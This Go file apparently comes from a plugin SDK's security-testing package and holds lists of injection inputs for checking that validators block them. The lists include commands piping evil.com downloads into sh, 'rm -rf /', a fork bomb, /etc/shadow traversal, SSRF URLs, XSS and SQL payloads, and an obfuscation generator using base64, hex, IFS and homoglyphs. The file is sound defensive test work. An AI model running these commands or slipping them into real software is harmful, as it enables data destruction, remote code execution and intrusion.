// Package sdk provides security testing utilities for DevEx plugins
package sdk

import (
	"fmt"
	"regexp"
	"strings"
	"unicode"
)

// SecurityTestSuite provides comprehensive security testing patterns for plugins
type SecurityTestSuite struct {
	// Shell metacharacter injection patterns
	ShellMetacharacters []string
	
	// Command substitution attack patterns  
	CommandSubstitutionPatterns []string
	
	// Path traversal attack patterns
	PathTraversalPatterns []string
	
	// Environment variable injection patterns
	EnvVarInjectionPatterns []string
	
	// Null byte injection patterns
	NullBytePatterns []string
	
	// Unicode and encoding attack patterns
	UnicodeAttackPatterns []string
	
	// Argument splitting attack patterns
	ArgumentSplittingPatterns []string
	
	// Script injection patterns
	ScriptInjectionPatterns []string
	
	// Network-based injection patterns
	NetworkInjectionPatterns []string
	
	// Process manipulation patterns
	ProcessManipulationPatterns []string
}

// NewSecurityTestSuite creates a new comprehensive security test suite
func NewSecurityTestSuite() *SecurityTestSuite {
	return &SecurityTestSuite{
		ShellMetacharacters: []string{
			";", "&&", "||", "|", "&", 
			">", ">>", "<", "<<",
			"`", "$(", "${",
			"*", "?", "[", "]",
			"'", "\"", "\\",
			"\n", "\r", "\t",
		},
		
		CommandSubstitutionPatterns: []string{
			"$(rm -rf /)",
			"`rm -rf /`",
			"${IFS}rm${IFS}-rf${IFS}/",
			"$(<command)",
			"`<command>`",
			"$(curl evil.com/malware.sh|sh)",
			"`wget -O- evil.com/payload`",
			"$(echo malicious > /etc/passwd)",
			"`id > /tmp/compromised`",
		},
		
		PathTraversalPatterns: []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"/../../etc/shadow",
			"....//....//etc//passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"..\\\\..\\\\..\\\\etc\\\\passwd",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"file:///../../../etc/passwd",
			"/proc/self/environ",
			"/proc/version",
			"/proc/cmdline",
		},
		
		EnvVarInjectionPatterns: []string{
			"$HOME; rm -rf /",
			"${PATH}||curl evil.com/malware.sh|sh",
			"$USER`whoami > /tmp/pwned`",
			"${SHELL:-/bin/sh -c 'malicious'}",
			"$((system('rm -rf /')))",
			"${IFS}rm${IFS}-rf${IFS}/",
			"$PATH/../../../etc/passwd",
			"$HOME/../../../../etc/shadow",
		},
		
		NullBytePatterns: []string{
			"safe\x00malicious",
			"file.txt\x00.exe",
			"normal\x00; rm -rf /",
			"config\x00/../../../etc/passwd",
			"app\x00`curl evil.com|sh`",
			"\x00/bin/sh",
			"value\x00\n\rinjection",
		},
		
		UnicodeAttackPatterns: []string{
			"app\u202e.txt", // Right-to-Left Override
			"file\u200b.exe", // Zero Width Space
			"normal\ufeff", // Byte Order Mark
			"app\u2028break", // Line Separator
			"test\u2029para", // Paragraph Separator  
			"\u0000null",
			"script\u0085next", // Next Line
			"app\u00a0space", // Non-breaking Space
			"мalicious.exe", // Cyrillic 'м' instead of 'm'
			"аpple.com", // Cyrillic 'а' instead of 'a'
		},
		
		ArgumentSplittingPatterns: []string{
			"app --flag value --malicious",
			"normal --config=/etc/passwd",
			"app \t--hidden-flag=malicious", 
			"normal\n--inject=payload",
			"app \r\n--evil=true",
			"test --flag=\"value\" --inject=\"$(rm -rf /)\"",
			"normal --config $IFS--malicious",
		},
		
		ScriptInjectionPatterns: []string{
			"</script><script>alert('xss')</script>",
			"'; DROP TABLE users; --",
			"1' OR '1'='1",
			"<img src=x onerror=alert(1)>",
			"javascript:alert('xss')",
			"data:text/html,<script>alert('xss')</script>",
			"{{7*7}}",
			"${7*7}",
			"[[${7*7}]]",
			"<%=7*7%>",
			"#{''.class.name}",
		},
		
		NetworkInjectionPatterns: []string{
			"http://evil.com/malware.sh",
			"https://127.0.0.1:8080/../../etc/passwd",
			"ftp://malicious-server.com/payload",
			"file:///etc/passwd",
			"ldap://evil.com/inject",
			"gopher://evil.com:70/inject",
			"jar:http://evil.com/malware.jar!/",
			"http://0x7f000001/payload", // IP obfuscation
			"http://2130706433/payload", // Decimal IP
			"http://0177.0.0.1/payload", // Octal IP
		},
		
		ProcessManipulationPatterns: []string{
			"kill -9 1", // Init process
			"kill -KILL $$", // Current process
			"killall -9 sshd",
			"pkill -f bash",
			"sudo -u root bash",
			"su - root",
			"chmod +s /bin/bash",
			"setuid(0)",
			"exec(\"/bin/sh\")",
			"system(\"rm -rf /\")",
		},
	}
}

// TestPatternValidation tests that validation functions properly reject malicious patterns
func (s *SecurityTestSuite) TestPatternValidation(validator func(string) error, patterns []string, testName string) []SecurityTestResult {
	var results []SecurityTestResult
	
	for _, pattern := range patterns {
		err := validator(pattern)
		result := SecurityTestResult{
			TestName: testName,
			Pattern:  pattern,
			Blocked:  err != nil,
		}
		
		if err != nil {
			result.ErrorMessage = err.Error()
		}
		
		results = append(results, result)
	}
	
	return results
}

// SecurityTestResult represents the result of a security test
type SecurityTestResult struct {
	TestName     string
	Pattern      string
	Blocked      bool
	ErrorMessage string
}

// TestCommandInjection comprehensively tests command injection prevention
func (s *SecurityTestSuite) TestCommandInjection(validator func(string) error) []SecurityTestResult {
	var allResults []SecurityTestResult
	
	// Test shell metacharacters
	results := s.TestPatternValidation(validator, s.generateMetacharacterInjections(), "Shell Metacharacters")
	allResults = append(allResults, results...)
	
	// Test command substitution
	results = s.TestPatternValidation(validator, s.CommandSubstitutionPatterns, "Command Substitution")
	allResults = append(allResults, results...)
	
	// Test environment variable injection
	results = s.TestPatternValidation(validator, s.EnvVarInjectionPatterns, "Environment Variable Injection")
	allResults = append(allResults, results...)
	
	// Test null byte injection
	results = s.TestPatternValidation(validator, s.NullBytePatterns, "Null Byte Injection")
	allResults = append(allResults, results...)
	
	return allResults
}

// TestPathInjection tests path traversal and file system injection prevention
func (s *SecurityTestSuite) TestPathInjection(validator func(string) error) []SecurityTestResult {
	return s.TestPatternValidation(validator, s.PathTraversalPatterns, "Path Traversal")
}

// TestURLInjection tests URL-based injection prevention
func (s *SecurityTestSuite) TestURLInjection(validator func(string) error) []SecurityTestResult {
	return s.TestPatternValidation(validator, s.NetworkInjectionPatterns, "URL Injection")
}

// TestUnicodeInjection tests Unicode and encoding-based attacks
func (s *SecurityTestSuite) TestUnicodeInjection(validator func(string) error) []SecurityTestResult {
	return s.TestPatternValidation(validator, s.UnicodeAttackPatterns, "Unicode Injection")
}

// TestArgumentSplitting tests argument splitting and parsing attacks
func (s *SecurityTestSuite) TestArgumentSplitting(validator func(string) error) []SecurityTestResult {
	return s.TestPatternValidation(validator, s.ArgumentSplittingPatterns, "Argument Splitting")
}

// generateMetacharacterInjections creates injection patterns using shell metacharacters
func (s *SecurityTestSuite) generateMetacharacterInjections() []string {
	baseCommands := []string{"normal-app", "config-file", "output-path"}
	var patterns []string
	
	for _, base := range baseCommands {
		for _, meta := range s.ShellMetacharacters {
			// Simple injection
			patterns = append(patterns, base+meta+"rm -rf /")
			patterns = append(patterns, base+meta+" malicious-command")
			
			// Complex injection  
			patterns = append(patterns, base+meta+"curl evil.com|sh")
			patterns = append(patterns, base+meta+"wget -O- evil.com/payload")
		}
	}
	
	return patterns
}

// ValidateSecurityTestResults checks if security tests passed (all patterns blocked)
func ValidateSecurityTestResults(results []SecurityTestResult) (bool, []string) {
	var failures []string
	allPassed := true
	
	for _, result := range results {
		if !result.Blocked {
			allPassed = false
			failures = append(failures, fmt.Sprintf("%s: Pattern '%s' was NOT blocked", 
				result.TestName, result.Pattern))
		}
	}
	
	return allPassed, failures
}

// AdvancedPatternGenerator generates sophisticated attack patterns
type AdvancedPatternGenerator struct {}

// NewAdvancedPatternGenerator creates a generator for complex attack patterns
func NewAdvancedPatternGenerator() *AdvancedPatternGenerator {
	return &AdvancedPatternGenerator{}
}

// GenerateObfuscatedCommands creates obfuscated versions of dangerous commands
func (g *AdvancedPatternGenerator) GenerateObfuscatedCommands() []string {
	baseCommands := []string{"rm -rf /", "curl evil.com|sh", "wget -O- malware.com"}
	var obfuscated []string
	
	for _, cmd := range baseCommands {
		// Base64 obfuscation
		obfuscated = append(obfuscated, fmt.Sprintf("echo '%s' | base64 -d | sh", cmd))
		
		// Hex obfuscation  
		obfuscated = append(obfuscated, g.hexEncode(cmd))
		
		// Variable substitution
		obfuscated = append(obfuscated, g.variableSubstitution(cmd))
		
		// IFS manipulation
		obfuscated = append(obfuscated, g.ifsManipulation(cmd))
		
		// Unicode obfuscation
		obfuscated = append(obfuscated, g.unicodeObfuscation(cmd))
	}
	
	return obfuscated
}

// hexEncode creates hex-encoded command injection
func (g *AdvancedPatternGenerator) hexEncode(cmd string) string {
	var hex strings.Builder
	for _, r := range cmd {
		hex.WriteString(fmt.Sprintf("\\x%02x", r))
	}
	return fmt.Sprintf("echo -e '%s' | sh", hex.String())
}

// variableSubstitution creates variable-based obfuscation
func (g *AdvancedPatternGenerator) variableSubstitution(cmd string) string {
	// Replace spaces with ${IFS}
	obfuscated := strings.ReplaceAll(cmd, " ", "${IFS}")
	return obfuscated
}

// ifsManipulation uses IFS (Internal Field Separator) manipulation
func (g *AdvancedPatternGenerator) ifsManipulation(cmd string) string {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return cmd
	}
	
	return "${IFS}" + strings.Join(parts, "${IFS}")
}

// unicodeObfuscation uses Unicode characters to obfuscate commands
func (g *AdvancedPatternGenerator) unicodeObfuscation(cmd string) string {
	var obfuscated strings.Builder
	for _, r := range cmd {
		if unicode.IsLetter(r) && r < 128 {
			// Use Unicode homoglyphs
			switch r {
			case 'a':
				obfuscated.WriteRune('а') // Cyrillic 'а'
			case 'o':
				obfuscated.WriteRune('о') // Cyrillic 'о' 
			case 'e':
				obfuscated.WriteRune('е') // Cyrillic 'е'
			case 'p':
				obfuscated.WriteRune('р') // Cyrillic 'р'
			case 'c':
				obfuscated.WriteRune('с') // Cyrillic 'с'
			default:
				obfuscated.WriteRune(r)
			}
		} else {
			obfuscated.WriteRune(r)
		}
	}
	return obfuscated.String()
}

// GeneratePolyglotPayloads creates payloads that work across multiple contexts
func (g *AdvancedPatternGenerator) GeneratePolyglotPayloads() []string {
	return []string{
		// Shell + SQL injection
		"'; rm -rf /; --",
		// Shell + XSS
		"<script>alert(1)</script>; rm -rf /",
		// Command + Template injection  
		"{{7*7}}; rm -rf /",
		// Multiple encoding
		"%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
		// Shell + LDAP injection
		")(cn=*)); rm -rf /",
		// Mixed quotes and escapes
		"'\"`;rm -rf /;`\"'",
		// Nested substitutions
		"$(echo $(rm -rf /))",
		"`echo `rm -rf /``",
	}
}

// BoundaryTestPatterns generates edge case patterns for boundary testing
func (g *AdvancedPatternGenerator) BoundaryTestPatterns() []string {
	return []string{
		// Very long patterns
		strings.Repeat("A", 10000) + "; rm -rf /",
		// Patterns with maximum metacharacters
		strings.Repeat(";", 100) + "rm -rf /",
		// Mixed encodings
		"\x00\x01\x02; rm -rf /",
		// Control characters
		"\r\n; rm -rf /",
		"\t; rm -rf /",
		// Unicode control characters
		"\u0000; rm -rf /",
		"\u2028; rm -rf /", // Line separator
		// Extremely nested patterns
		"$($($(rm -rf /))))",
		// Multiple null bytes
		"\x00\x00\x00; rm -rf /",
		// Binary data
		string([]byte{0x89, 0x50, 0x4E, 0x47}) + "; rm -rf /",
	}
}

// TimeBasedPatterns generates patterns for time-based attacks
func (g *AdvancedPatternGenerator) TimeBasedPatterns() []string {
	return []string{
		"sleep 30",
		"timeout 30s rm -rf /",
		"ping -c 100 127.0.0.1",
		"yes > /dev/null &",
		":(){ :|:& };:", // Fork bomb
		"cat /dev/zero > /dev/null &",
		"while true; do echo; done",
	}
}

// ProtocolConfusionPatterns generates protocol confusion attack patterns  
func (g *AdvancedPatternGenerator) ProtocolConfusionPatterns() []string {
	return []string{
		"http://127.0.0.1:22/", // HTTP to SSH port
		"https://127.0.0.1:21/", // HTTPS to FTP port  
		"ftp://127.0.0.1:80/", // FTP to HTTP port
		"ldap://127.0.0.1:443/", // LDAP to HTTPS port
		"gopher://127.0.0.1:25/", // Gopher to SMTP port
		"dict://127.0.0.1:6379/", // Dict to Redis port
		"file:///proc/net/tcp", // File protocol to proc filesystem
		"jar:file:///etc/passwd!/", // JAR protocol
	}
}

// TestResultSummary provides a summary of security test results
type TestResultSummary struct {
	TotalTests     int
	PassedTests    int
	FailedTests    int
	FailedPatterns []string
	PassRate       float64
}

// SummarizeResults creates a summary of security test results
func SummarizeResults(results []SecurityTestResult) TestResultSummary {
	total := len(results)
	passed := 0
	var failedPatterns []string
	
	for _, result := range results {
		if result.Blocked {
			passed++
		} else {
			failedPatterns = append(failedPatterns, 
				fmt.Sprintf("%s: %s", result.TestName, result.Pattern))
		}
	}
	
	failed := total - passed
	passRate := 0.0
	if total > 0 {
		passRate = float64(passed) / float64(total) * 100.0
	}
	
	return TestResultSummary{
		TotalTests:     total,
		PassedTests:    passed, 
		FailedTests:    failed,
		FailedPatterns: failedPatterns,
		PassRate:       passRate,
	}
}

// IsSecurityTestPassing determines if security tests meet minimum standards
func IsSecurityTestPassing(summary TestResultSummary, minimumPassRate float64) bool {
	return summary.PassRate >= minimumPassRate
}

// PrintSecurityTestReport prints a formatted security test report
func PrintSecurityTestReport(summary TestResultSummary) string {
	var report strings.Builder
	
	report.WriteString("Security Test Summary\n")
	report.WriteString("====================\n")
	report.WriteString(fmt.Sprintf("Total Tests: %d\n", summary.TotalTests))
	report.WriteString(fmt.Sprintf("Passed: %d\n", summary.PassedTests))
	report.WriteString(fmt.Sprintf("Failed: %d\n", summary.FailedTests))
	report.WriteString(fmt.Sprintf("Pass Rate: %.2f%%\n", summary.PassRate))
	
	if summary.FailedTests > 0 {
		report.WriteString("\nFailed Patterns:\n")
		for _, pattern := range summary.FailedPatterns {
			report.WriteString(fmt.Sprintf("- %s\n", pattern))
		}
	}
	
	return report.String()
}

// RegexValidationPatterns provides regex patterns for common validation scenarios
var RegexValidationPatterns = struct {
	SafeFilename        *regexp.Regexp
	SafeURL            *regexp.Regexp
	SafeCommand        *regexp.Regexp
	SafeEnvironmentVar *regexp.Regexp
}{
	SafeFilename:        regexp.MustCompile(`^[a-zA-Z0-9._-]+$`),
	SafeURL:            regexp.MustCompile(`^https?://[a-zA-Z0-9.-]+(/[a-zA-Z0-9._/-]*)?(\?[a-zA-Z0-9=&_-]*)?$`),
	SafeCommand:        regexp.MustCompile(`^[a-zA-Z0-9\s./=_-]+$`),
	SafeEnvironmentVar: regexp.MustCompile(`^[A-Z_][A-Z0-9_]*$`),
}
